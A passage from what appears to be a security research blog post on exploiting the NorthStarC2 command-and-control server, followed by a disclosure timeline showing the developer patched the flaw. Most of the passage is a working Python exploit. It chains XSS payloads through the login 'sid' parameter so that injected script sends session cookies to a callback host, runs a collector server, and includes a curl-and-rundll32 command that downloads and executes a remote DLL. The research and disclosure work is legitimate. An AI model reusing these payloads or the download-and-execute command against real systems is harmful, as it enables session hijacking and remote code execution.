</span></span><span style="display:flex;"><span>    encrypted_sid <span style="color:#f92672">=</span> xor_encryption(sid, <span style="color:#e6db74">&#34;northstar&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(encrypted_sid<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target_url, callback_url):
</span></span><span style="display:flex;"><span>    target_url <span style="color:#f92672">=</span> target_url<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;/&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/login.php&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    protocol <span style="color:#f92672">=</span> callback_url<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;://&#34;</span>
</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> callback_url<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;/&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    h1, h2 <span style="color:#f92672">=</span> host[:len(host)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>], host[len(host)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> callback_url<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>        port <span style="color:#f92672">=</span> callback_url<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)[<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> protocol <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;https://&#34;</span>:
</span></span><span style="display:flex;"><span>            port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;443&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;80&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sid_payloads <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;N*/&lt;/script&gt;&lt;q&#34;</span>, <span style="color:#e6db74">&#34;N*/i.src=u/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/new Image;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var i=/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/s+h+p+&#39;/&#39;+c;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var u=/*q&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N*/&#39;</span><span style="color:#e6db74">{</span>protocol<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var s=/*q&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N*/&#39;:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var p=/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/a+b;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var h=/*q&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N*/&#39;</span><span style="color:#e6db74">{</span>h2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var b=/*q&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;N*/&#39;</span><span style="color:#e6db74">{</span>h1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var a=/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/d.cookie;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var c=/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/document;/*q&#34;</span>, <span style="color:#e6db74">&#34;N*/var d=/*q&#34;</span>, <span style="color:#e6db74">&#34;N&lt;/td&gt;&lt;script&gt;/*q&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> sid <span style="color:#f92672">in</span> sid_payloads:
</span></span><span style="display:flex;"><span>        print(sid)
</span></span><span style="display:flex;"><span>        params <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;sid&#39;</span>: generate_sid(sid)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        requests<span style="color:#f92672">.</span>get(target_url, params<span style="color:#f92672">=</span>params, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(port):
</span></span><span style="display:flex;"><span>    server_address <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;&#39;</span>, int(port))
</span></span><span style="display:flex;"><span>    httpd <span style="color:#f92672">=</span> HTTPServer(server_address, Collector)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Server running on port </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    httpd<span style="color:#f92672">.</span>serve_forever()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cradle_command <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;curl http://192.168.1.6:8000/stager.dll &gt; c:\users\public\stager.dll &amp; rundll32 c:\users\public\stager.dll,inject &amp; echo DONE&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>callback_host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.6&#34;</span>
</span></span><span style="display:flex;"><span>callback_port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8080&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.4:80&#34;</span>
</span></span><span style="display:flex;"><span>callback_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>callback_host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>callback_port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Sending malicious agent registrations...&#34;</span>)
</span></span><span style="display:flex;"><span>exploit(target_url, callback_url)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Registrations finished, waiting for execution...&#34;</span>)
</span></span><span style="display:flex;"><span>run(callback_port)
</span></span></code></pre></div><h3 id="disclosure">Disclosure</h3>
<p>2024-03-12 Notified developer <br>
2024-03-12 <a href="https://github.com/EnginDemirbilek/NorthStarC2/commit/7674a4457fca83058a157c03aa7bccd02f4a213c">Developer pushes patch</a></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://www.mandiant.com/resources/blog/suspected-iranian-actor-targeting-israeli-shipping">https://www.mandiant.com/resources/blog/suspected-iranian-actor-targeting-israeli-shipping</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://exchange.xforce.ibmcloud.com/collection/Recent-Hive0016-Infrastructure-and-Use-of-NorthStarC2-Pentest-Framework-77196fe57bb122088c210286da5d5b20">https://exchange.xforce.ibmcloud.com/collection/Recent-Hive0016-Infrastructure-and-Use-of-NorthStarC2-Pentest-Framework-77196fe57bb122088c210286da5d5b20</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/may-hot-apt-security-events-techniques-tracker">https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/may-hot-apt-security-events-techniques-tracker</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p><a href="https://github.com/ACE-Responder/RogueSliver">https://github.com/ACE-Responder/RogueSliver</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p><a href="https://aceresponder.com/blog/exploiting-empire-c2-framework">https://aceresponder.com/blog/exploiting-empire-c2-framework</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p><a href="https://github.com/EnginDemirbilek/NorthStarC2/wiki/Architecture#northstar-stager-registration-workflow">https://github.com/EnginDemirbilek/NorthStarC2/wiki/Architecture#northstar-stager-registration-workflow</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p><a href="https://sliver.sh/docs?name=Stagers">https://sliver.sh/docs?name=Stagers</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
